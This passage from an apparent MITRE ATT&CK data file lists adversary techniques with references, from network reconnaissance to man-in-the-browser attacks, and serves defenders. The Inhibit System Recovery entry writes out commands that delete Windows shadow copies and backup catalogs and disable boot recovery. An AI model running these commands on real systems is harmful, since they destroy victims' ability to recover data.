href='https:\u002F\u002Fwww.whois.net\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdnsdumpster.com\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.circl.lu\u002Fservices\u002Fpassive-dns\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:_,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1590"},{source_name:aS,url:bF,description:bG},{source_name:az,url:aA,description:aB},{source_name:aT,url:aU,description:aV}],tactics:[l],subtechniques:[ub,ud,uf,uh,uj,ul]},{id:aW,"object-type":a,name:"Gather Victim Org Information",description:"Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions\u002Fdepartments, specifics of business operations, as well as the roles and responsibilities of key employees.\n\nAdversaries may gather this information in various ways, such as direct elicitation via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001'\u003ESocial Media\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatpost.com\u002Fbroadvoice-leaks-350m-records-voicemail-transcripts\u002F160158\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.dobsearch.com\u002Fbusiness-lookup\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:aW,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1591"},{source_name:bH,url:bI,description:bJ},{source_name:un,url:uo,description:up}],tactics:[l],subtechniques:[uq,us,uu,uw]},{id:uy,"object-type":a,name:"Graphical User Interface",description:"**This technique has been deprecated. Please use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021'\u003ERemote Services\u003C\u002Fa\u003E where appropriate.**\n\nThe Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1076'\u003ERemote Desktop Protocol\u003C\u002Fa\u003E, instead of through a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059'\u003ECommand and Scripting Interpreter\u003C\u002Fa\u003E, to search for information and execute files via mouse double-click events, the Windows Run command \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FRun_command'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, or other potentially difficult to monitor interactions.",external_references:[{source_name:b,external_id:uy,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1061"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FRun_command",description:"Wikipedia. (2018, August 3). Run Command. Retrieved October 12, 2018.",source_name:"Wikipedia Run Command"}],tactics:[p]},{id:uz,"object-type":a,name:"Hardware Additions",description:"Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping \u003Csup\u003E\u003Ca href='https:\u002F\u002Fossmann.blogspot.com\u002F2011\u002F02\u002Fthrowing-star-lan-tap.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, man-in-the middle encryption breaking \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.youtube.com\u002Fwatch?v=lDvf4ScWbcQ'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, keystroke injection \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.hak5.org\u002Fblog\u002Fmain-blog\u002Fstealing-files-with-the-usb-rubber-ducky-usb-exfiltration-explained'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, kernel memory reading via DMA \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.youtube.com\u002Fwatch?v=fXthwl6ShOg'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, adding new wireless access to an existing network \u003Csup\u003E\u003Ca href='https:\u002F\u002Farstechnica.com\u002Finformation-technology\u002F2012\u002F03\u002Fthe-pwn-plug-is-a-little-white-box-that-can-hack-your-network\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, and others.",external_references:[{source_name:b,external_id:uz,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1200"},{external_id:"CAPEC-440",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F440.html"},{url:"https:\u002F\u002Fossmann.blogspot.com\u002F2011\u002F02\u002Fthrowing-star-lan-tap.html",description:"Michael Ossmann. (2011, February 17). Throwing Star LAN Tap. Retrieved March 30, 2018.",source_name:"Ossmann Star Feb 2011"},{url:"https:\u002F\u002Fwww.youtube.com\u002Fwatch?v=lDvf4ScWbcQ",description:"Nick Aleks. (2015, November 7). Weapons of a Pentester - Understanding the virtual & physical tools used by white\u002Fblack hat hackers. Retrieved March 30, 2018.",source_name:"Aleks Weapons Nov 2015"},{url:"https:\u002F\u002Fwww.hak5.org\u002Fblog\u002Fmain-blog\u002Fstealing-files-with-the-usb-rubber-ducky-usb-exfiltration-explained",description:"Hak5. (2016, December 7). Stealing Files with the USB Rubber Ducky – USB Exfiltration Explained. Retrieved March 30, 2018.",source_name:"Hak5 RubberDuck Dec 2016"},{url:"https:\u002F\u002Fwww.youtube.com\u002Fwatch?v=fXthwl6ShOg",description:"Ulf Frisk. (2016, August 5). Direct Memory Attack the Kernel. Retrieved March 30, 2018.",source_name:"Frisk DMA August 2016"},{url:"https:\u002F\u002Farstechnica.com\u002Finformation-technology\u002F2012\u002F03\u002Fthe-pwn-plug-is-a-little-white-box-that-can-hack-your-network\u002F",description:"Robert McMillan. (2012, March 3). The Pwn Plug is a little white box that can hack your network. Retrieved March 30, 2018.",source_name:"McMillan Pwn March 2012"}],tactics:[q]},{id:U,"object-type":a,name:"Hide Artifacts",description:"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F09\u002Funit42-sofacys-komplex-os-x-trojan\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fgo.cybereason.com\u002Frs\u002F996-YZT-709\u002Fimages\u002FCybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002F101\u002F2015\u002F07\u002Fintroduction-to-alternate-data-streams\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnews.sophos.com\u002Fen-us\u002F2020\u002F05\u002F21\u002Fragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:U,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1564"},{url:bl,description:bm,source_name:bn},{url:uA,description:uB,source_name:uC},{url:uD,description:uE,source_name:uF},{source_name:uG,url:uH,description:uI}],tactics:[d],subtechniques:[uJ,uL,uN,uP,uR,uT,uV]},{id:F,"object-type":a,name:"Hijack Execution Flow",description:"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs\u002Fresources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",external_references:[{source_name:b,external_id:F,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574"},{source_name:uX,url:uY,description:uZ}],tactics:[k,u,d],subtechniques:[u_,va,ve,vg,vi,vp,vr,vv,vC,vH,vJ]},{id:vL,"object-type":a,name:"Hypervisor",description:"**This technique has been deprecated and should no longer be used.**\n\nA type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FHypervisor'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FXen'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E A type-1 hypervisor operates at a level below the operating system and could be designed with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1014'\u003ERootkit\u003C\u002Fa\u003E functionality to hide its existence from the guest operating system. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fciteseerx.ist.psu.edu\u002Fviewdoc\u002Fdownload?doi=10.1.1.90.8832&rep=rep1&type=pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E A malicious hypervisor of this nature could be used to persist on systems through interruption.",external_references:[{source_name:b,external_id:vL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1062"},{external_id:fN,source_name:c,url:fO},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FHypervisor",description:"Wikipedia. (2016, May 23). Hypervisor. Retrieved June 11, 2016.",source_name:"Wikipedia Hypervisor"},{url:"http:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FXen",description:"Xen. (n.d.). In Wikipedia. Retrieved November 13, 2014.",source_name:"Wikipedia Xen"},{url:"http:\u002F\u002Fciteseerx.ist.psu.edu\u002Fviewdoc\u002Fdownload?doi=10.1.1.90.8832&rep=rep1&type=pdf",description:"Myers, M., and Youndt, S. (2007). An Introduction to Hardware-Assisted Virtual Machine (HVM) Rootkits. Retrieved November 13, 2014.",source_name:"Myers 2007"},{url:"http:\u002F\u002Fvirtualization.info\u002Fen\u002Fnews\u002F2006\u002F08\u002Fdebunking-blue-pill-myth.html",description:"virtualization.info. (Interviewer) & Liguori, A. (Interviewee). (2006, August 11). Debunking Blue Pill myth &#91;Interview transcript&#93;. Retrieved November 13, 2014.",source_name:"virtualization.info 2006"}],tactics:[k]},{id:V,"object-type":a,name:"Impair Defenses",description:"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",external_references:[{source_name:b,external_id:V,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1562"}],tactics:[d],subtechniques:[vM,vO,vQ,vS,vU,vW,wf]},{id:wh,"object-type":a,name:"Implant Internal Image",description:"Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608\u002F001'\u003EUpload Malware\u003C\u002Fa\u003E, this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.\u003Csup\u003E\u003Ca href='https:\u002F\u002Frhinosecuritylabs.com\u002Faws\u002Fcloud-container-attack-tool\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nA tool has been developed to facilitate planting backdoors in cloud container images.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FRhinoSecurityLabs\u002Fccat'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1505\u002F003'\u003EWeb Shell\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Frhinosecuritylabs.com\u002Faws\u002Fcloud-container-attack-tool\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:wh,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1525"},{source_name:"Rhino Labs Cloud Image Backdoor Technique Sept 2019",url:"https:\u002F\u002Frhinosecuritylabs.com\u002Faws\u002Fcloud-container-attack-tool\u002F",description:"Rhino Labs. (2019, August). Exploiting AWS ECR and ECS with the Cloud Container Attack Tool (CCAT). Retrieved September 12, 2019."},{source_name:"Rhino Labs Cloud Backdoor September 2019",url:"https:\u002F\u002Fgithub.com\u002FRhinoSecurityLabs\u002Fccat",description:"Rhino Labs. (2019, September). Cloud Container Attack Tool (CCAT). Retrieved September 12, 2019."}],tactics:[k]},{id:$,"object-type":a,name:"Indicator Removal on Host",description:"Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux\u002FmacOS files such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F003'\u003EBash History\u003C\u002Fa\u003E and \u002Fvar\u002Flog\u002F*.\n\nThese actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",external_references:[{source_name:b,external_id:$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1070"},{external_id:"CAPEC-93",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F93.html"}],tactics:[d],subtechniques:[wi,wk,wm,wo,wq,ws]},{id:wu,"object-type":a,name:"Indirect Command Execution",description:"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E. For example, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0193'\u003EForfiles\u003C\u002Fa\u003E, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059'\u003ECommand and Scripting Interpreter\u003C\u002Fa\u003E, Run window, or via scripts. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftwitter.com\u002Fvector_sec\u002Fstatus\u002F896049052642533376'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftwitter.com\u002FEvi1cg\u002Fstatus\u002F935027922397573120'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse these features for \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0005'\u003EDefense Evasion\u003C\u002Fa\u003E, specifically to perform arbitrary execution while subverting detections and\u002For mitigation controls (such as Group Policy) that limit\u002Fprevent the usage of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E or file extensions more commonly associated with malicious payloads.",external_references:[{source_name:b,external_id:wu,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1202"},{url:"https:\u002F\u002Ftwitter.com\u002Fvector_sec\u002Fstatus\u002F896049052642533376",description:"vector_sec. (2017, August 11). Defenders watching launches of cmd? What about forfiles?. Retrieved January 22, 2018.",source_name:"VectorSec ForFiles Aug 2017"},{url:"https:\u002F\u002Ftwitter.com\u002FEvi1cg\u002Fstatus\u002F935027922397573120",description:"Evi1cg. (2017, November 26). block cmd.exe ? try this :. Retrieved January 22, 2018.",source_name:"Evi1cg Forfiles Nov 2017"},{url:"https:\u002F\u002Fcommunity.rsa.com\u002Fcommunity\u002Fproducts\u002Fnetwitness\u002Fblog\u002F2017\u002F08\u002F14\u002Fare-you-looking-out-for-forfilesexe-if-you-are-watching-for-cmdexe",description:"Partington, E. (2017, August 14). Are you looking out for forfiles.exe (if you are watching for cmd.exe). Retrieved January 22, 2018.",source_name:"RSA Forfiles Aug 2017"}],tactics:[d]},{id:wv,"object-type":a,name:"Ingress Tool Transfer",description:"Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",external_references:[{source_name:b,external_id:wv,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1105"},{url:f,description:g,source_name:h}],tactics:[o]},{id:ww,"object-type":a,name:"Inhibit System Recovery",description:"Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F02\u002Folympic-destroyer.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F05\u002Fwannacry-malware-profile.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1485'\u003EData Destruction\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1486'\u003EData Encrypted for Impact\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F02\u002Folympic-destroyer.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F05\u002Fwannacry-malware-profile.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* \u003Ccode\u003Evssadmin.exe\u003C\u002Fcode\u003E can be used to delete all volume shadow copies on a system - \u003Ccode\u003Evssadmin.exe delete shadows \u002Fall \u002Fquiet\u003C\u002Fcode\u003E\n* \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1047'\u003EWindows Management Instrumentation\u003C\u002Fa\u003E can be used to delete volume shadow copies - \u003Ccode\u003Ewmic shadowcopy delete\u003C\u002Fcode\u003E\n* \u003Ccode\u003Ewbadmin.exe\u003C\u002Fcode\u003E can be used to delete the Windows Backup Catalog - \u003Ccode\u003Ewbadmin.exe delete catalog -quiet\u003C\u002Fcode\u003E\n* \u003Ccode\u003Ebcdedit.exe\u003C\u002Fcode\u003E can be used to disable automatic Windows recovery features by modifying boot configuration data - \u003Ccode\u003Ebcdedit.exe \u002Fset {default} bootstatuspolicy ignoreallfailures & bcdedit \u002Fset {default} recoveryenabled no\u003C\u002Fcode\u003E",external_references:[{external_id:ww,source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1490"},{source_name:bs,url:bt,description:bu},{source_name:or,url:os,description:ot}],tactics:[j]},{id:aX,"object-type":a,name:"Input Capture",description:"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages\u002Fportals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056\u002F004'\u003ECredential API Hooking\u003C\u002Fa\u003E) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056\u002F003'\u003EWeb Portal Capture\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:aX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056"},{external_id:wx,source_name:c,url:wy},{url:wz,description:wA,source_name:wB}],tactics:[m,r],subtechniques:[wC,wE,wG,wI]},{id:c$,"object-type":a,name:"Inter-Process Communication",description:"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages\u002Flibraries or native interfaces such as Windows \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F002'\u003EDynamic Data Exchange\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001'\u003EComponent Object Model\u003C\u002Fa\u003E. Higher level execution mediums, such as those of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059'\u003ECommand and Scripting Interpreter\u003C\u002Fa\u003Es, may also leverage underlying IPC mechanisms.",external_references:[{source_name:b,external_id:c$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559"}],tactics:[p],subtechniques:[wK,wM]},{id:wO,"object-type":a,name:"Internal Spearphishing",description:"Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Fphishing-starts-inside\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may leverage \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F001'\u003ESpearphishing Attachment\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F002'\u003ESpearphishing Link\u003C\u002Fa\u003E as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056'\u003EInput Capture\u003C\u002Fa\u003E on sites that mimic email login interfaces.\n\nThere have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Fphishing-starts-inside\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.\u003Csup\u003E\u003Ca href='https:\u002F\u002Flabs.ft.com\u002F2013\u002F05\u002Fa-sobering-day\u002F?mhq5j=e6'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{external_id:wO,source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1534"},{description:"Chris Taylor. (2017, October 5). When Phishing Starts from the Inside. Retrieved October 8, 2019.",url:"https:\u002F\u002Fblog.trendmicro.com\u002Fphishing-starts-inside\u002F",source_name:"Trend Micro When Phishing Starts from the Inside 2017"},{description:"THE FINANCIAL TIMES. (2019, September 2). A sobering day. Retrieved October 8, 2019.",url:"https:\u002F\u002Flabs.ft.com\u002F2013\u002F05\u002Fa-sobering-day\u002F?mhq5j=e6",source_name:"THE FINANCIAL TIMES LTD 2019."}],tactics:[x]},{id:wP,"object-type":a,name:"LC_MAIN Hijacking",description:"**This technique has been deprecated and should no longer be used.**\n\nAs of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary’s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  \u003Csup\u003E\u003Ca href='https:\u002F\u002Fassets.documentcloud.org\u002Fdocuments\u002F2459197\u002Fbit9-carbon-black-threat-research-report-2015.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different  \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.",external_references:[{source_name:b,external_id:wP,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1149"},{url:"https:\u002F\u002Fassets.documentcloud.org\u002Fdocuments\u002F2459197\u002Fbit9-carbon-black-threat-research-report-2015.pdf",description:"Bit9 + Carbon Black Threat Research Team. (2015). 2015: The Most Prolific Year in History for OS X Malware. Retrieved July 8, 2017.",source_name:"Prolific OSX Malware History"},{url:B,description:S,source_name:T}],tactics:[d]},{id:wQ,"object-type":a,name:"Lateral Tool Transfer",description:"Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F002'\u003ESMB\u002FWindows Admin Shares\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F001'\u003ERemote Desktop Protocol\u003C\u002Fa\u003E. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",external_references:[{source_name:b,external_id:wQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1570"}],tactics:[x]},{id:wR,"object-type":a,name:"Man in the Browser",description:"Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FMan-in-the-browser'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nA specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as 